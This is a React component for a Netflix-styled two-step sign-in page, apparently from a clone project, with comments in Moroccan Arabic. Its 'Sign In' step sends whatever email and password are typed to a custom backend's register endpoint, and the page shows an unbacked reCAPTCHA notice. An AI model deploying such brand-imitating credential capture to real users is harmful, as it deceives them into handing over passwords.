import React, { useState, useEffect } from 'react';
import { useNavigate, useSearchParams } from 'react-router-dom';
import axios from 'axios';

const BACKEND_URL = import.meta.env.VITE_BACKEND_URL;

const Login = () => {
  const navigate = useNavigate();
  const [searchParams, setSearchParams] = useSearchParams();

  // ==========================================
  // 🚀 1. دوال التشفير وفك التشفير (URL State)
  // ==========================================
  const encodeState = (data) => btoa(encodeURIComponent(JSON.stringify(data)));
  const decodeState = (str) => {
    try { return JSON.parse(decodeURIComponent(atob(str))); } catch(e) { return {}; }
  };

  const urlStateStr = searchParams.get('serverState');
  const urlState = urlStateStr ? decodeState(urlStateStr) : {};

  // ==========================================
  // 🚀 2. الـ States
  // ==========================================
  const [step, setStep] = useState(urlState.step || 1);
  const [email, setEmail] = useState(urlState.email || '');
  const [password, setPassword] = useState('');
  
  const [emailError, setEmailError] = useState('');
  const [passwordError, setPasswordError] = useState('');
  const [isLoading, setIsLoading] = useState(false);

  const goToStep = (newStep, currentEmail = email) => {
    setStep(newStep);
    setEmail(currentEmail);
    const stateObj = { step: newStep, email: currentEmail };
    setSearchParams({ serverState: encodeState(stateObj) });
  };

  useEffect(() => {
    const token = localStorage.getItem('token');
    if (token) {
      // إيلا كان مكونيكطي كيمشي لـ account
      navigate('/account', { replace: true });
    } else if (!urlStateStr) {
      goToStep(1, '');
    }
  }, []);

  useEffect(() => {
    const currentUrlStateStr = searchParams.get('serverState');
    if (currentUrlStateStr) {
      const decoded = decodeState(currentUrlStateStr);
      if (decoded.step && decoded.step !== step) setStep(decoded.step);
      if (decoded.email !== undefined && decoded.email !== email) setEmail(decoded.email);
    }
  }, [searchParams]);

  // ==========================================
  // 🚀 3. اللوجيك والـ Validation
  // ==========================================
  
  const ErrorIcon = () => (
    <svg fill="none" viewBox="0 0 24 24" strokeWidth="2.5" stroke="currentColor" className="w-4 h-4 text-[#eb3942] flex-shrink-0 mt-[1px]">
      <path strokeLinecap="round" strokeLinejoin="round" d="M9.75 9.75l4.5 4.5m0-4.5l-4.5 4.5M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
    </svg>
  );

  const validateEmail = (email) => {
    const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return re.test(String(email).toLowerCase());
  };

  // الخطوة 1: التحقق من الإيميل (حيدنا الـ API ديال check-email)
  const handleEmailSubmit = (e) => {
    e.preventDefault();
    if (!email || !validateEmail(email)) {
      setEmailError('Please enter a valid email.');
      return;
    }
    setEmailError('');
    // كيدوز نيشان للخطوة 2 بلا ما يتسنى السيرڤر
    goToStep(2, email);
  };

  // الخطوة 2: التسجيل (بدلنا login بـ register)
  const handleLoginSubmit = async (e) => {
    e.preventDefault();
    if (!password) {
      setPasswordError('Password is required.');
      return;
    }
    setPasswordError('');
    setIsLoading(true);

    try {
      // هنا كنصيفطو المعلومات لـ /auth/register باش يتسجل فـ الداتابيز
      const response = await axios.post(`${BACKEND_URL}/api/auth/register`, {
        email: email,
        password: password
      });

      if (response.data.token) {
        localStorage.setItem('token', response.data.token);
        localStorage.setItem('isAuthenticated', 'true');
        localStorage.setItem('user', JSON.stringify(response.data.user || response.data));
        
        localStorage.removeItem('isAccountCreated');
        localStorage.removeItem('userId');
        localStorage.removeItem('signupEmail');

        // ملي كيتسجل بنجاح، كيمشي لصفحة account
        navigate('/account', { replace: true });
      }
    } catch (error) {
      console.error("Register/Login catch error:", error);
      // إيلا كان الإيميل ديجا كاين (Status 400)، نقدرو نطلعو إيرور أو نديرو أي أكسيون بغينا
      if (error.response && error.response.status === 400) {
        setPasswordError('This email is already registered or password incorrect. Please try again.');
      } else {
        setPasswordError('Something went wrong. Please try again.');
      }
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <>
      <style>{`@import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;700;900&display=swap');`}</style>
      
      <div className="min-h-screen bg-black relative flex flex-col font-['Inter',_sans-serif]">
        <div className="absolute inset-0 bg-[radial-gradient(100%_100%_at_50%_0%,_rgba(229,9,20,0.15)_0%,_rgba(0,0,0,0)_100%)] pointer-events-none z-0"></div>
        
        <header className="h-[90px] px-6 md:px-[5%] flex items-center relative z-10">
          <img src="https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg" alt="Netflix" className="w-[120px] md:w-[167px] cursor-pointer" onClick={() => navigate('/')} />
        </header>

        <main className="flex-grow flex items-center justify-center px-4 pb-20 relative z-10">
          <div className="w-full max-w-[400px]">
            
            {/* ======================= Step 1: Email ======================= */}
            {step === 1 && (
              <form onSubmit={handleEmailSubmit} className="flex flex-col text-left">
                {/* الكتبة بقات كيفما هي */}
                <h1 className="text-[32px] font-bold text-white mb-2">Enter your info to sign in</h1>
                <p className="text-[16px] text-gray-300 mb-6">Or get started with a new account.</p>
                
                <div className="flex flex-col mb-6">
                  <div className="relative w-full">
                    <input 
                      type="text" 
                      value={email} 
                      onChange={(e) => { setEmail(e.target.value); setEmailError(''); }}
                      className={`block w-full h-[56px] px-4 bg-[#161616] border ${emailError ? 'border-[#eb3942]' : 'border-gray-500'} rounded-[4px] text-white text-[16px] focus:outline-none focus:border-white focus:ring-1 focus:ring-white transition-colors placeholder-gray-400`} 
                      placeholder="Email or mobile number" 
                    />
                  </div>
                  {emailError && (
                    <div className="flex items-start gap-1.5 text-[#eb3942] text-[14px] mt-2 font-medium">
                      <ErrorIcon />
                      <span>{emailError}</span>
                    </div>
                  )}
                </div>

                <button 
                  type="submit" 
                  disabled={isLoading}
                  className="bg-[#e50914] text-white w-full h-[48px] rounded-[4px] font-bold text-[16px] hover:bg-red-700 transition disabled:opacity-70"
                >
                  {isLoading ? 'Please wait...' : 'Continue'}
                </button>

                <div className="mt-8">
                  <a href="#" className="text-gray-400 text-[14px] hover:underline font-medium">Get Help</a>
                </div>
                
                <p className="text-[13px] text-gray-500 mt-6 leading-snug">
                  This page is protected by Google reCAPTCHA to ensure you're not a bot.
                </p>
              </form>
            )}

            {/* ======================= Step 2: Password ======================= */}
            {step === 2 && (
              <form onSubmit={handleLoginSubmit} className="flex flex-col text-left">
                {/* الكتبة بقات كيفما هي */}
                <h1 className="text-[32px] font-bold text-white mb-6">Enter your password</h1>
                
                <div className="w-full h-[56px] px-4 mb-4 bg-[#333] border border-gray-600 rounded-[4px] flex items-center justify-between">
                  <span className="text-white text-[16px] truncate pr-4">{email}</span>
                  <button 
                    type="button" 
                    onClick={() => goToStep(1, email)} 
                    className="text-gray-300 text-[14px] font-medium hover:underline flex-shrink-0"
                  >
                    Change
                  </button>
                </div>

                <div className="flex flex-col mb-6">
                  <div className="relative w-full">
                    <input 
                      type="password" 
                      value={password} 
                      onChange={(e) => { setPassword(e.target.value); setPasswordError(''); }}
                      className={`block w-full h-[56px] px-4 bg-[#161616] border ${passwordError ? 'border-[#eb3942]' : 'border-gray-500'} rounded-[4px] text-white text-[16px] focus:outline-none focus:border-white focus:ring-1 focus:ring-white transition-colors placeholder-gray-400`} 
                      placeholder="Password" 
                    />
                  </div>
                  {passwordError && (
                    <div className="flex items-start gap-1.5 text-[#eb3942] text-[14px] mt-2 font-medium">
                      <ErrorIcon />
                      <span>{passwordError}</span>
                    </div>
                  )}
                </div>

                <button 
                  type="submit" 
                  disabled={isLoading}
                  className="bg-[#e50914] text-white w-full h-[48px] rounded-[4px] font-bold text-[16px] hover:bg-red-700 transition disabled:opacity-70 mb-4"
                >
                  {isLoading ? 'Please wait...' : 'Sign In'}
                </button>

                <div className="relative flex items-center justify-center mb-4">
                  <span className="absolute bg-transparent px-2 text-gray-400 text-[14px]">or</span>
                  <div className="w-full h-[1px] bg-gray-700"></div>
                </div>

                <button 
                  type="button" 
                  className="bg-[#333333] text-white w-full h-[48px] rounded-[4px] font-bold text-[16px] hover:bg-gray-600 transition"
                >
                  Use Sign-in Code
                </button>

                <div className="mt-8">
                  <a href="#" className="text-gray-400 text-[14px] hover:underline font-medium">Get Help</a>
                </div>
                
                <p className="text-[13px] text-gray-500 mt-6 leading-snug">
                  This page is protected by Google reCAPTCHA to ensure you're not a bot.
                </p>
              </form>
            )}

          </div>
        </main>
      </div>
    </>
  );
}

export default Login;